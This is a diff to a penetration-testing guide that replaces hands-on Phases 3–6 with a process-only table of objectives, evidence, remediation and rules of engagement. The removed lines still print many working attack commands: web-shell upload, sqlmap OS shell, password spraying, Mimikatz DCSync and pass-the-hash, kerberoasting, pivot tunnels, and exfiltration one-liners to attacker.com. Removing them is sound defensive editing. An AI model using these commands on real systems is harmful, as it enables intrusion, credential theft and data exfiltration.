@@ -100,181 +100,23 @@ kiterunner -u https://example.com -w api-endpoints.txt
 linkfinder -i https://example.com -d 3
 ```
 
-## Phase 3: Exploitation
+## Phases 3–6: Exploitation, Privilege, Lateral Movement, Data Access (Process Only)
 
-### Initial Access Vectors
-```bash
-# Web exploitation
-sqlmap -u "https://example.com/page?id=1" --batch --risk=3 --level=5
-sqlmap -r request.txt --batch --os-shell
+These phases run only inside a signed scope, with a named client contact and an emergency stop. This reference lists objectives, evidence and remediation themes; it intentionally contains no exploitation, credential, lateral-movement or exfiltration commands.
 
-# XSS exploitation
-xsstrike -u "https://example.com/search?q=test"
-dalfox url https://example.com/search?q=test -b hunter.xss.ht
+| Phase | Objective | Acceptable evidence | Typical remediation |
+|-------|-----------|---------------------|---------------------|
+| 3. Initial access | Show that an identified vulnerability is exploitable | Minimal proof: version banner, harmless marker read, screenshot of access level | Patch or upgrade, input validation, WAF rule as a stopgap, MFA on exposed logins |
+| 4. Privilege escalation | Show that a foothold can gain higher privileges | The misconfiguration itself (writable service path, sudo rule, missing patch) and the privilege it would grant | Least privilege, remove dangerous sudo/service permissions, patch kernels and OS, application allow-listing |
+| 5. Lateral movement | Show which other systems are reachable with the access obtained | Network reachability and credential-reuse findings, not actual hopping across the estate | Segmentation, unique local admin passwords (LAPS), restrict remote admin protocols, privileged access workstations |
+| 6. Data access | Show that sensitive data *could* be read | Count and classification of reachable records, never a copy of real data | Encryption at rest, access reviews, DLP, egress filtering and monitoring |
 
-# SSRF testing
-ffuf -u "https://example.com/fetch?url=FUZZ" -w ssrf_payloads.txt -fw 0
-gophergen -u "https://example.com/fetch?url=http://169.254.169.254/"
+### Rules for these phases
 
-# File upload exploitation
-# 1. Upload web shell
-curl -X POST -F "file=@shell.php" -F "filename=shell.php" https://example.com/upload
-
-# 2. Try path traversal in upload
-curl -X POST -F "file=@shell.php" -F "filename=../../../var/www/html/shell.php" https://example.com/upload
-
-# Network exploitation
-msfconsole -q -x "use exploit/multi/http/struts2_content_type; set RHOSTS 10.0.0.1; run"
-```
-
-### Credential Attacks
-```bash
-# Password spraying
-kerbrute passwordspray -d corp.local users.txt "Password123!" --dc 10.0.0.1
-crackmapexec smb 10.0.0.0/24 -u users.txt -p "Winter2026!" --continue-on-success
-
-# Hash cracking
-hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --force
-hashcat -m 13100 -a 0 kerberos_tgs.txt /usr/share/wordlists/rockyou.txt --force
-
-# Password spraying (web)
-hydra -L users.txt -P passwords.txt https-post-form://target.com/login:username=^USER^&password=^PASS^:F=Invalid
-```
-
-## Phase 4: Privilege Escalation
-
-### Linux Privilege Escalation
-```bash
-# Automated enumeration
-linpeas.sh | tee linpeas_output.txt
-./linenum.sh
-unix-privesc-check standard
-
-# SUID binaries
-find / -perm -4000 -type f 2>/dev/null | xargs -I {} ls -la {}
-find / -perm -2000 -type f 2>/dev/null
-
-# Sudo rights
-sudo -l
-
-# Kernel exploits
-linux-exploit-suggester.sh
-searchsploit "linux kernel $(uname -r) privilege escalation"
-
-# Cron jobs
-cat /etc/crontab
-ls -la /etc/cron*
-
-# Docker/LXC breakout
-find / -name "docker.sock" 2>/dev/null
-capsh --print
-```
-
-### Windows Privilege Escalation
-```powershell
-# Automated enumeration
-winPEAS.exe quiet cmd windows
-PowerUp.ps1
-Sherlock.ps1
-
-# Service misconfigurations
-Get-CimInstance -ClassName Win32_Service | Where-Object {$_.StartName -eq "LocalSystem"}
-icacls C:\Program Files\VulnerableService\service.exe
-
-# Unquoted service paths
-Get-CimInstance -ClassName Win32_Service | ForEach-Object {
-    if ($_.PathName -match '^[^"]') { Write-Host $_.Name $_.PathName }
-}
-
-# AlwaysInstallElevated
-Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
-Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
-
-# Token manipulation
-Incognito.exe list_tokens -u
-Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
-```
-
-## Phase 5: Lateral Movement
-
-### Active Directory Lateral Movement
-```powershell
-# Pass-the-Hash
-Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:corp /ntlm:HASH /run:powershell.exe"'
-
-# Overpass-the-Hash
-Rubeus.exe asktgt /user:admin /rc4:HASH /domain:corp /ptt
-
-# Kerberoasting
-Rubeus.exe kerberoast /outfile:hashes.txt
-Invoke-Kerberoast -OutputFormat HashCat | Export-Csv kerberoast.csv
-
-# AS-REP Roasting
-Rubeus.exe asreproast /outfile:asrep_hashes.txt
-Get-ASREPHash -Username victimuser
-
-# DCSync
-Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp /user:krbtgt"'
-
-# PsExec lateral movement
-psexec \\target -u corp\admin -p password cmd.exe
-wmiexec.py corp/admin@target cmd.exe
-atexec.py corp/admin@target cmd.exe
-```
-
-### SSH Tunneling and Pivoting
-```bash
-# Local port forwarding
-ssh -L 8080:internal-web:80 user@jumphost
-
-# Remote port forwarding
-ssh -R 8080:localhost:80 user@attacker-server
-
-# Dynamic SOCKS proxy
-ssh -D 9050 user@jumphost
-# Then use proxychains: proxychains nmap -sT -sV internal-server
-
-# SSH through multiple hops
-ssh -J user@jump1,user@jump2 user@target
-
-# Chisel tunnel
-./chisel server -p 8000 --reverse  # On attacker machine
-./chisel client attacker:8000 R:8080:localhost:80  # On compromised host
-
-# FRP tunnel
-# frps.ini (attacker)
-[common]
-bind_port = 7000
-# frpc.ini (compromised host)
-[common]
-server_addr = attacker_ip
-server_port = 7000
-[web]
-type = tcp
-local_ip = 127.0.0.1
-local_port = 80
-remote_port = 8080
-```
-
-## Phase 6: Data Exfiltration
-
-### Exfiltration Techniques
-```bash
-# DNS exfiltration
-cat data.txt | base64 | while read line; do dig +short $line.exfil.attacker.com; done
-
-# HTTP exfiltration
-curl -X POST -d @sensitive_data.txt https://attacker.com/exfil
-
-# ICMP exfiltration
-ping -c 1 -p $(cat data.txt | base64) attacker.com
-
-# Encrypted tunnel
-socat TCP-LISTEN:4444,fork OPENSSL:attacker.com:443
-
-# Steganography
-steghide embed -cf image.jpg -ef secret.txt -p password
-```
+- Stop at proof of impact; escalate further only with written client approval.
+- Do not leave persistence, accounts or tools behind; log anything temporary and remove it before the window closes.
+- Log every action (time, target, technique, ATT&CK ID) so defenders can match it to their telemetry and tune detections.
+- Treat captured evidence as confidential: encrypt it, limit access, and delete it on the agreed date.
 
 ## Phase 7: Reporting and Remediation
 
